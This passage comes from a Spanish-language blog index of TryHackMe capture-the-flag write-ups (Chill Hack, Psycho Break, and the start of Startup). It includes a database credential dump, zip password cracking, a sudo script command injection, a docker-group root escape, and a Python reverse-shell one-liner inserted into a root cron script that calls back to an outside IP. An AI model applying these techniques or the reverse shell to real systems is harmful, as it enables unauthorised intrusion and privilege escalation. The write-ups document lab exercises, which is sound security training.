\u0026#34;. $e-\u0026gt;getMessage()); } require_once(\u0026#34;account.php\u0026#34;); $account = new Account($con); $success = $account-\u0026gt;login($username,$password); if($success) { header(\u0026#34;Location: hacker.php\u0026#34;); } } ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;signInContainer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;column\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h2 style=\u0026#34;color:blue;\u0026#34;\u0026gt;Customer Portal\u0026lt;/h2\u0026gt; \u0026lt;h3 style=\u0026#34;color:green;\u0026#34;\u0026gt;Log In\u0026lt;h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;?php echo $success?\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;Username\u0026#34; required\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34; required\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Utilizamos dichas credenciales para poder obtener acceso a la base de datos webportal, donde pudimos obtener credenciales encriptadas de los usuarios: Aurick y cullapaar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  www-data@ubuntu:/var/www/files$ mysql -u root -p mysql -u root -p Enter password: [ ... snip ... ] [ ... snip ... ] mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | webportal | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use webportal; use webportal; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; show tables; +---------------------+ | Tables_in_webportal | +---------------------+ | users | +---------------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; select * from users; +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614c[ ... snip ... ]806cc4fd | | 2 | Apaar | Dahal | cullapaar | 68621624[ ... snip ... ]c789a649 | +----+-----------+----------+-----------+----------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt;   Utilizando crackstation.net logramos obtener las contraseñas en texto plano.\nTambien encontramos un puerto local el cual esta \u0026ldquo;enlazado\u0026rdquo; a una pagina web, y esta misma esta dirigida a los archivos de la carpeta /var/www/files donde encontramos las credenciales de la base de datos ẁebportal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  www-data@ubuntu:/$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - www-data@ubuntu:/$ www-data@ubuntu:/etc/apache2/sites-enabled$ ls -lah ls -lah total 8.0K drwxr-xr-x 2 root root 4.0K Oct 3 03:44 . drwxr-xr-x 8 root root 4.0K Oct 3 04:44 .. lrwxrwxrwx 1 root root 35 Oct 3 03:44 000-default.conf -\u0026gt; ../sites-available/000-default.conf www-data@ubuntu:/etc/apache2/sites-enabled$ cat 000-default.conf [ ... snip ... ] \u0026lt;VirtualHost *:9001\u0026gt; # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request\u0026#39;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/files # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with \u0026#34;a2disconf\u0026#34;. #Include conf-available/serve-cgi-bin.conf \u0026lt;/VirtualHost\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet www-data@ubuntu:/etc/apache2/sites-enabled$   APAAR - USER Tambien encontramos que es posible ejecutar el archivo /home/apaar/.helpline.sh utilizando sudo con el usuario apaar. El archivo realiza varias impresiones y obtiene dos valores que se almacenan en las variables $persona y $msg, este ultimo es ejecutado y los errores se envian a /dev/null.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #!/bin/bash  echo echo \u0026#34;Welcome to helpdesk. Feel free to talk to anyone at any time!\u0026#34; echo read -p \u0026#34;Enter the person whom you want to talk with: \u0026#34; person read -p \u0026#34;Hello user! I am $person, Please enter your message: \u0026#34; msg $msg 2\u0026gt;/dev/null echo \u0026#34;Thank you for your precious time!\u0026#34;   Ejecutamos el archivo y le pasamos un comando en lugar de un mensaje la segunda opcion ($msg) el cual se ejecuta y se muestra en la pantalla.\nPara obtener una shell y la flag user.txt ejecutamos bash.\nSTEGO Enumeramos las carpetas del usuario pero no encontramos nada interesante. Regresamos nuevamente a la carpeta /var/www/files donde encontramos un mensaje interesante. En la misma carpeta encontramos dos imagenes las cuales descargamos y analizamos localmente utilizando steghide, encontramos en el archivo JPG un archivo backup.zip el cual esta protegido por contraseña.\n1 2 3 4 5 6 7 8  kali@kali:~/thm/chillhack$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg Enter passphrase: wrote extracted data to \u0026#34;backup.zip\u0026#34;. kali@kali:~/thm/chillhack$ unzip backup.zip Archive: backup.zip [backup.zip] source_code.php password: skipping: source_code.php incorrect password kali@kali:~/thm/chillhack$   Utilizamos zip2john y john para extraer y obtener la contraseña en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12  kali@kali:~/thm/chillhack$ zip2john backup.zip \u0026gt; hash_backupzip ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 kali@kali:~/thm/chillhack$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_backupzip Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [... snip ... ] (backup.zip/source_code.php) 1g 0:00:00:00 DONE (2020-12-09 19:33) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/chillhack$   ANURODH - USER Encontramos un archivo PHP, el cual contiene una contraseña codificada en base64.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; Admin Portal \u0026lt;/head\u0026gt; \u0026lt;title\u0026gt; Site Under Development ... \u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; Email: \u0026lt;input type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; placeholder=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])) { $email = $_POST[\u0026#34;email\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; if(base64_encode($password) == \u0026#34;IWQwbnRLbjB[... snip ... ]zdzByZA==\u0026#34;) { $random = rand(1000,9999);?\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; Enter the OTP: \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;otp\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submitOtp\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php\tmail($email,\u0026#34;OTP for authentication\u0026#34;,$random); if(isset($_POST[\u0026#34;submitOtp\u0026#34;])) { $otp = $_POST[\u0026#34;otp\u0026#34;]; if($otp == $random) { echo \u0026#34;Welcome Anurodh!\u0026#34;; header(\u0026#34;Location: authenticated.php\u0026#34;); } else { echo \u0026#34;Invalid OTP\u0026#34;; } } } else { echo \u0026#34;Invalid Username or Password\u0026#34;; } } ?\u0026gt; \u0026lt;/html\u0026gt;   Utilizamos esta contraseña para cambiar al usuario anurodh y obtener una shell con este usuario.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo docker. Utilizamos docker para obtener una shell con el usuario root y nuestra flag root.txt.\n1  docker run -it -v /:/mnt alpine chroot /mnt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  root@d88bfe712182:~# cat proof.txt cat proof.txt {ROOT-FLAG: [... snip ... ]} Congratulations! You have successfully completed the challenge. ,-.-. ,----. _,.---._ .-._ ,----. ,-..-.-./ \\==\\ ,-.--` , \\  _.-. _.-. _,..---._ ,-.\u0026#39; , - `. /==/ \\ .-._ ,-.--` , \\ |, \\=/\\=|- |==||==|- _.-` .-,.\u0026#39;| .-,.\u0026#39;| /==/, - \\ /==/_, , - \\|==|, \\/ /, /==|- _.-` |- |/ |/ , /==/|==| `.-.|==|, | |==|, | |==| _ _\\==| .=. |==|- \\| ||==| `.-. \\, , _|==/==/_ , /|==|- | |==|- | |==| .=. |==|_ : ;=: - |==| , | -/==/_ , / | - - , |==|==| .-\u0026#39; |==|, | |==|, | |==|,| | -|==| , \u0026#39;=\u0026#39; |==| - _ |==| .-\u0026#39; \\ , - /==/|==|_ ,`-._|==|- `-._|==|- `-._ |==| \u0026#39;=\u0026#39; /\\==\\ - ,_ /|==| /\\ , |==|_ ,`-._ |- /\\ /==/ /==/ , //==/ - , ,/==/ - , ,/ |==|-, _`/ \u0026#39;.=\u0026#39;. - .\u0026#39; /==/, | |- /==/ , / `--` `--` `--`-----`` `--`-----\u0026#39;`--`-----\u0026#39; `-.`.____.\u0026#39; `--`--\u0026#39;\u0026#39; `--`./ `--`--`-----`` --------------------------------------------Designed By ------------------------------------------------------- | Anurodh Acharya | --------------------- Let me know if you liked it. Twitter - @acharya_anurodh Linkedin - www.linkedin.com/in/anurodh-acharya-b1937116a root@d88bfe712182:~#   ","description":"Chill Hack es una maquina de TryHackMe, ejecutamos una shell inversa tras enumerar el sitio web. Obtuvimos acceso al siguiente usuario con un script ejecutado con sudo. Un pequeño reto de esteganografia nos permitio realizar nuevamente movimiento lateral. Finalmente escalamos privilegios utilizando docker.","id":30,"section":"posts","tags":["steganography","steghide","docker","sudo privesc","ftp"],"title":"TryHackMe - Chill Hack","uri":"https://sckull.github.io/posts/chillhack/"},{"content":"  Psycho Break es una maquina de TryHackMe, es CTF Like por los multiples retos que se presentan.\nRoom    Titulo Psycho Break      Descripción Help Sebastian and his team of investigators to withstand the dangers that come ahead.   Puntos 208   Dificultad Facil   Maker shafdo     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (2) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.80 scan initiated Wed Dec 9 21:22:51 2020 as: nmap -o allPorts psycho.thm Nmap scan report for psycho.thm (10.10.253.212) Host is up (0.28s latency). Not shown: 997 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 21:23:31 2020 -- 1 IP address (1 host up) scanned in 39.29 seconds # Nmap 7.80 scan initiated Wed Dec 9 21:23:49 2020 as: nmap -p21,22,80 -sV -sC -o servicePorts psycho.thm Nmap scan report for psycho.thm (10.10.253.212) Host is up (0.35s latency). PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA) | 256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA) |_ 256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome To Becon Mental Hospital Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 21:24:09 2020 -- 1 IP address (1 host up) scanned in 19.76 seconds   HTTP Encontramos una pagina web en el puerto 80.\nEn la pagina inicial encontramos un comentario con una direccion.\n1  \u0026lt;!-- Sebastian sees a path through the darkness which leads to a room =\u0026gt; /sadistRoom --\u0026gt;   En la nueva direccion se muestra un comentario en HTML y tambien al presionar el \u0026ldquo;link\u0026rdquo; mostrado en la pagina salta una alerta que muestra una \u0026ldquo;llave\u0026rdquo;, esa misma llave se encuentra en un archivo de javascript junto con una nueva direccion /lockerRoom/.\n1  \u0026lt;!-- To find more about Sadist visit https://theevilwithin.fandom.com/wiki/Sadist --\u0026gt;   En esta nueva direccion encontramos un mensaje \u0026ldquo;codificado\u0026rdquo; y una nueva direccion en un \u0026ldquo;link\u0026rdquo; hacia un \u0026ldquo;mapa\u0026rdquo;.\nUtilizando guballa.de logramos obtener el texto codificado en vigenere.\nIngresamos al mapa y nos pregunta la llave, ingresamos el texto decodificado y nos muestra direcciones.\nEn Safe Heaven encontramos solamente imagenes.\nY en el codigo fuente un comentario.\n1  \u0026lt;!-- I think I\u0026#39;m having a terrible nightmare. Search through me and find it ... --\u0026gt;   En Abandoned Room pide una llave.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en Safe Heaven.\n1 2 3 4 5  kali@kali:~/thm/psychobreak$ gobuster dir -u http://psycho.thm/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt /imgs (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /keeper (Status: 200)   Encontramos una pagina la cual nos muestra una direccion hacia otra.\nEn esta ultima nos pide que ingresemos el lugar exacto de la imagen presentada.\nUtilizamos Google imagenes para poder subir y obtener la respuesta. Al ingresar la respuesta nos muestra una llave nueva, la cual ingresamos en /abandonedRoom/.\nNos muestra una nueva pagina y muestra otra direccion nueva.\nEn la direccion nueva nos muestra un timer y un mensaje RUN. RUN. Runn Get out of here !!!. En el codigo fuente de esta pagina encontramos dos comentarios.\nEl primer comentario habla sobre una \u0026ldquo;shell\u0026rdquo; dentro de la pagina.\n1 2 3  \u0026lt;!-- There is something called \u0026#34;shell\u0026#34; on current page maybe that\u0026#39;ll help you to get out of here !!!--\u0026gt; \u0026lt;!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) --\u0026gt;   Le pasamos ?shell=id en la pagina actual y retorno un comentario en el cual indica que el comando no esta permitido.\nRealizamos una pequeña enumeracion y encontramos una nueva direccion en la cual no hemos estado y se muestran varios archivos.\nEncontramos un archivo de texto y un archivo zip.\nYou made it. Escaping from Laura is not easy, good job .... Dentro del archivo zip encontramos un archivo de texto y una imagen, este ultimo al parecer es un archivo zip y no de imagen.\n1 2 3 4 5 6 7 8 9  kali@kali:~/thm/psychobreak$ cat helpme.txt From [... snip ...], Who ever sees this message \u0026#34;HELP Me\u0026#34;. Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I\u0026#39;ll tell you what happened when I am out of this cell. kali@kali:~/thm/psychobreak$ file Table.jpg Table.jpg: Zip archive data, at least v2.0 to extract   STEGO En el archivo zip (Table.jpg) encontramos una imagen un archivo de audio que parece ser codigo morse.\n1 2 3 4  kali@kali:~/thm/psychobreak$ unzip Table.jpg Archive: Table.jpg inflating: Joseph_Oda.jpg inflating: key.wav   Utilizamos morsecode.world para obtener el texto.\nUtilizamos el texto encontrado para extraer informacion de la imagen con steghide, donde encontramos credenciales para el servicio FTP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  kali@kali:~/thm/psychobreak$ steghide extract -sf Joseph_Oda.jpg Enter passphrase: wrote extracted data to \u0026#34;thankyou.txt\u0026#34;. kali@kali:~/thm/psychobreak$ cat thankyou.txt From [... snip ...], Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. But for some reason there is my name listed on the note which I don\u0026#39;t have a clue. -------------------------------------------- //\t\\\\ ||\t(NOTE) FTP Details\t|| || ==================\t|| ||\t|| ||\tUSER : [... snip ...]\t|| ||\tPASSWORD : [... snip ...]\t|| ||\t|| \\\\\t// -------------------------------------------- Good luck, Be carefull !!! kali@kali:~/thm/psychobreak$   FTP Ingresamos al servicio FTP con las credenciales encontradas y vemos dos archivos, uno de ellos es un ejecutable, el segundo parece ser un wordlist.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful 150 Opening ASCII mode data connection for file list drwxr-xr-x 2 0 0 4.0k Aug 13 15:20 . drwxr-xr-x 2 0 0 4.0k Aug 13 15:20 .. -rwxr-xr-x 1 joseph joseph 11.1M Aug 13 15:12 program -rw-r--r-- 1 joseph joseph 974 Aug 13 15:20 random.dic 226 Transfer complete ftp\u0026gt; get program local: program remote: program 200 PORT command successful 150 Opening BINARY mode data connection for program (11641688 bytes) 226 Transfer complete 11641688 bytes received in 70.65 secs (160.9213 kB/s) ftp\u0026gt; get random.dic local: random.dic remote: random.dic 200 PORT command successful 150 Opening BINARY mode data connection for random.dic (974 bytes) 226 Transfer complete 974 bytes received in 0.00 secs (6.6826 MB/s) ftp\u0026gt; exit 221 Goodbye. kali@kali:~/thm/psychobreak$ file program program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped kali@kali:~/thm/psychobreak$ head random.dic 000000 111111 123123 123321 1234 12345 123456 1234567 12345678 123456789 kali@kali:~/thm/psychobreak$   Al ejecutar el programa nos pide una \u0026ldquo;palabra\u0026rdquo;. Utilizando el diccionario y bash logramos obtener la palabra correcta y nos muestra el siguiente mensaje.\n1 2 3 4 5 6 7 8 9 10 11 12  kali@kali:~/thm/psychobreak/ftp$ while read line; do ./program \u0026#34;$line\u0026#34; \u0026amp;\u0026amp; echo $line; done \u0026lt; random.dic 000000 =\u0026gt; Incorrect 000000 [... snip ... ] [... snip ... ] =\u0026gt; Correct Well Done !!! Decode This =\u0026gt; 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33   El mensaje incluye unos numeros lo que parecen ser un mensaje codificado con numeros que representan un teclado de telefono.\nUtilizamos dcode.fr - multi-tap phone para obtener el texto.\nKIDMAN - USER Con la palabra y el mensaje decodificado intentamos ingresar mediante el servicio SSH con estas \u0026ldquo;credenciales\u0026rdquo;, logrando obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion al archivo /etc/crontab y encontramos un cron que se ejecuta cada dos minutos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  kidman@evilwithin:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) */2 * * * * root python3 /var/.the_eye_of_ruvik.py   El cron ejecuta un archivo de python, el cual escribe una \u0026ldquo;oracion\u0026rdquo; dentro del archivo .the_eye.txt. Tenemos permisos de escritura en el archivo de python por lo que lo modificamos para ejecutar una shell inversa.\n1 2 3 4 5 6 7 8 9  .the_eye_of_ruvik.py #!/usr/bin/python3 import subprocess import random stuff = [\u0026#34;I am watching you.\u0026#34;,\u0026#34;No one can hide from me.\u0026#34;,\u0026#34;Ruvik ...\u0026#34;,\u0026#34;No one shall hide from me\u0026#34;,\u0026#34;No one can escape from me\u0026#34;] sentence = \u0026#34;\u0026#34;.join(random.sample(stuff,1)) subprocess.call(\u0026#34;echo %s\u0026gt; /home/kidman/.the_eye.txt\u0026#34;%(sentence),shell=True)   1 2  subprocess.call(\u0026#34;echo %s\u0026gt; /home/kidman/.the_eye.txt\u0026#34;%(sentence),shell=True) import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.1.1.1\u0026#34;,1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\u0026#34;/bin/sh -i\u0026#34;)   Logramos obtener una shell con el usuario root y nuestra flag root.txt.\n","description":"Psycho Break es una maquina de TryHackMe, es CTF Like por los multiples retos que se presentan.","id":31,"section":"posts","tags":["steganography","steghide","cronjob","ftp"],"title":"TryHackMe - Psycho Break","uri":"https://sckull.github.io/posts/psychobreak/"},{"content":"  Startup es una maquina de TryHackMe utilizamos FTP para subir una webshell para luego obtener una shell. Accedimos con un segundo usuario analizando un archivo PCAP. Finalmente ejecutamos una shell inversa editando un script utilizado por un CronJob.\nRoom    Titulo Startup      Descripción Abuse traditional vulnerabilities via untraditional means.   Puntos 140   Dificultad Facil   Maker elbee     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Wed Dec 9 02:42:39 2020 as: nmap -p- --min-rate 1000 -o allPorts startup.thm Nmap scan report for startup.thm (10.10.134.232) Host is up (0.27s latency). Not shown: 64048 closed ports, 1484 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 02:45:09 2020 -- 1 IP address (1 host up) scanned in 150.15 seconds # Nmap 7.80 scan initiated Wed Dec 9 02:45:44 2020 as: nmap -p80,21,22,80 -sV -sC -o servicePorts startup.thm Nmap scan report for startup.thm (10.10.134.232) Host is up (0.27s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) | 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 02:46:02 2020 -- 1 IP address (1 host up) scanned in 17.95 seconds   FTP Ingresamos al servicio FTP con las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous), donde encontramos algunos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  kali@kali:~/thm/startup$ ftp startup.thm Connected to startup.thm. 220 (vsFTPd 3.0.3) Name (startup.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u0026gt; get .test.log local: .test.log remote: .test.log 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .test.log (5 bytes). 226 Transfer complete. 5 bytes received in 0.00 secs (13.9909 kB/s) ftp\u0026gt; get important.jpg local: important.jpg remote: important.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for important.jpg (251631 bytes). 226 Transfer complete. 251631 bytes received in 1.15 secs (214.0925 kB/s) ftp\u0026gt; get notice.txt local: notice.txt remote: notice.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for notice.txt (208 bytes). 226 Transfer complete. 208 bytes received in 0.00 secs (259.4189 kB/s) ftp\u0026gt; cd ftp 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. 226 Directory send OK. ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt;   Imagen encontrada en FTP\nUno de los archivos contiene un mensaje en el cual indica que \u0026ldquo;alguien esta compartiendo archivos (memes) en la carpeta (de ftp) y estos archivos se muestran en la pagina web\u0026rdquo;. Lo cual indica que en cierta parte de la pagina web se muestran los archivos que se encuentran en el servicio ftp.\n1 2 3 4 5  kali@kali:~/thm/startup$ cat notice.txt Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus. kali@kali:~/thm/startup$ cat .test.log test kali@kali:~/thm/startup$   HTTP Encontramos una pagina web en el puerto 80 la cual no contiene informacion interesante.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6  kali@kali:~/thm/startup$ gobuster dir -u http://startup.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /files (Status: 301) /index.html (Status: 200) /index.html 